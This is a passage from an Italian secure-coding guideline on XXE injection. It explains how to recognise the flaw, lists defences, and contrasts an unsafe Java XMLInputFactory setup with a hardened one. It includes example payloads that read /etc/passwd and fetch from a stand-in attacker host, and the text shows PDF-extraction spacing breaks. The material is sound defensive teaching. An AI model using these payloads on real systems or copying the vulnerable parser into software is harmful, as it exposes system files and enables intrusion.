@@ -1,0 +1,54 @@
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 68  a 156  
+ 
+7.2.9  XML External Entity (XXE) injection 
+Come riconoscerla  
+Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
+dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
+parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
+le password di sistema oppure eseguito del codice m alevolo. 
+Esempio: 
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
+<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
+Come difendersi 
+• Bisogna evitare di incorporare entità esterne. 
+• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
+• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
+sensibili. 
+• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
+dell'applicazione o sul sistema operativo sottostan te.  
+• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
+• Implementare la convalida dell’input come evidenzia to in altri punti. 
+• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
+uno schema XSD. 
+ 
+Esempio : 
+Formato non corretto 
+/* Carica il documento XML e ne mostra il contenuto  */ 
+String maliciousSample = "xxe.xml"; 
+XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
+ 
+try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
+  // Load XML stream 
+  XMLStreamReader xmlStreamReader = factory.createX MLStreamReader(fis);  // Non 
+sicuro; xmlStreamReader risulta vulnerabile 
+ 
+Formato corretto 
+/* Carica il documento XML e ne mostra il contenuto  */ 
+String maliciousSample = "xxe.xml"; 
+XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
+ 
+// disabilita la risoluzione di entità esterne 
+factory.setProperty(XMLInputFactory.IS_SUPPORTING_E XTERNAL_ENTITIES, 
+Boolean.FALSE); 
+ 
+// oppure disabilita completamente i DTDs 
+factory.setProperty(XMLInputFactory.SUPPORT_DTD, Bo olean.FALSE); 
+ 
+try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
+    // Carica il document XML 
+    XMLStreamReader xmlStreamReader = factory.creat eXMLStreamReader(fis); 
+ 
+7.2.10  Ulteriori indicazioni per lo sviluppo sicuro 
+La seguente raccolta di Best Practices è riconosciu ta ufficialmente da Oracle Java.  
